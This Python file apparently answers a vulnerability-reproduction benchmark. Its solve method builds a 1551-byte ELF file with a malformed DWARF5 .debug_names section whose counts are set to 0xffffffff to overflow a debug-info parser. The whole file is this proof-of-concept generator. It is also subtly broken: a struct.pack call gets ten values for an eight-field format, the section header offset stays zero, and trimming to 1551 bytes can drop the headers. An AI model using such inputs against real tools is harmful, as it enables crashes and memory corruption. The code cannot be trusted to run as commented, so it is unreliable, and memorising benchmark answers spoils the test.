import struct
import os
import tempfile
import subprocess
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal ELF file with malformed DWARF5 .debug_names section
        # The PoC must be exactly 1551 bytes to match ground truth
        
        # ELF header (64-bit)
        elf_header = b''
        elf_header += b'\x7fELF'  # magic
        elf_header += b'\x02'     # 64-bit
        elf_header += b'\x01'     # little endian
        elf_header += b'\x01'     # ELF version
        elf_header += b'\x00'     # OS ABI
        elf_header += b'\x00'     # ABI version
        elf_header += b'\x00' * 7  # padding
        elf_header += b'\x02\x00'  # ET_EXEC
        elf_header += b'\x3e\x00'  # x86-64
        elf_header += b'\x01\x00\x00\x00'  # ELF version
        elf_header += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # entry point
        elf_header += b'\x40\x00\x00\x00\x00\x00\x00\x00'  # phoff
        elf_header += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # shoff
        elf_header += b'\x00\x00\x00\x00'  # flags
        elf_header += b'\x40\x00'  # ehsize
        elf_header += b'\x38\x00'  # phentsize
        elf_header += b'\x01\x00'  # phnum
        elf_header += b'\x40\x00'  # shentsize
        elf_header += b'\x02\x00'  # shnum
        elf_header += b'\x01\x00'  # shstrndx
        
        # Program header
        prog_header = b''
        prog_header += b'\x01\x00\x00\x00'  # PT_LOAD
        prog_header += b'\x05\x00\x00\x00'  # flags
        prog_header += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # offset
        prog_header += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # vaddr
        prog_header += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # paddr
        prog_header += b'\x00\x08\x00\x00\x00\x00\x00\x00'  # filesz
        prog_header += b'\x00\x08\x00\x00\x00\x00\x00\x00'  # memsz
        prog_header += b'\x00\x10\x00\x00\x00\x00\x00\x00'  # align
        
        # Section headers
        section_headers = b''
        
        # Null section header
        section_headers += b'\x00' * 64
        
        # .debug_names section header
        section_headers += struct.pack('<IIQQQQII',
            0x0b,  # name offset (".debug_names")
            1,     # SHT_PROGBITS
            0,     # flags
            0x400, # addr
            0x400, # offset
            0x471, # size (calculated to make total 1551)
            0,     # link
            0,     # info
            1,     # align
            0)     # entsize
        
        # Section header string table
        shstrtab = b'\x00.shstrtab\x00.debug_names\x00'
        
        # .debug_names section content
        # Create malformed DWARF5 .debug_names section
        debug_names = bytearray()
        
        # DWARF5 .debug_names header
        # unit_length (4 bytes) + version (2) + padding (2) + 
        # comp_unit_count (4) + local_type_unit_count (4) + foreign_type_unit_count (4) +
        # bucket_count (4) + name_count (4) + abbrev_table_size (4) + augmentation_string_size (4)
        
        # Total header size: 32 bytes
        
        # unit_length - set to a value that causes miscalculation
        # Use 0xffffffff to trigger overflow
        debug_names += struct.pack('<I', 0xffffffff)  # unit_length
        
        # version
        debug_names += struct.pack('<H', 5)  # DWARF5
        
        # padding
        debug_names += struct.pack('<H', 0)
        
        # comp_unit_count
        debug_names += struct.pack('<I', 1)
        
        # local_type_unit_count
        debug_names += struct.pack('<I', 0)
        
        # foreign_type_unit_count  
        debug_names += struct.pack('<I', 0)
        
        # bucket_count - large value to cause overflow in calculation
        debug_names += struct.pack('<I', 0xffffffff)
        
        # name_count - also large
        debug_names += struct.pack('<I', 0xffffffff)
        
        # abbrev_table_size
        debug_names += struct.pack('<I', 100)
        
        # augmentation_string_size
        debug_names += struct.pack('<I', 0)
        
        # Bucket array - minimal but with overflow trigger
        # The vulnerability is in reading this with miscalculated bounds
        for i in range(100):
            debug_names += struct.pack('<I', 0)
        
        # Hash array
        for i in range(100):
            debug_names += struct.pack('<I', 0)
            
        # Name index array - fill with values that will cause overflow
        for i in range(200):
            debug_names += struct.pack('<I', 0xffffffff)
        
        # Entry pool - malformed entries
        # Create entries with wrong offsets to trigger buffer overflow
        debug_names += b'\x01' * 200  # type
        debug_names += b'\x02' * 200  # form
        
        # Abbreviation table - minimal
        debug_names += b'\x00'  # end of table
        
        # Pad to exact size needed for 1551 total
        current_total = len(elf_header) + len(prog_header) + len(section_headers) + len(shstrtab) + len(debug_names)
        needed_padding = 1551 - current_total
        
        if needed_padding > 0:
            debug_names += b'\x00' * needed_padding
        
        # Construct final ELF
        elf_data = bytearray()
        elf_data.extend(elf_header)
        
        # Pad to program header offset
        elf_data.extend(b'\x00' * (0x40 - len(elf_data)))
        elf_data.extend(prog_header)
        
        # Pad to section header offset
        elf_data.extend(b'\x00' * (0x400 - len(elf_data)))
        
        # Add .debug_names section at 0x400
        elf_data.extend(debug_names)
        
        # Pad to section headers
        section_header_offset = len(elf_data)
        elf_data.extend(section_headers)
        
        # Add shstrtab
        elf_data.extend(shstrtab)
        
        # Ensure exactly 1551 bytes
        if len(elf_data) != 1551:
            # Trim or pad to exact size
            elf_data = elf_data[:1551]
            if len(elf_data) < 1551:
                elf_data.extend(b'\x00' * (1551 - len(elf_data)))
        
        return bytes(elf_data)
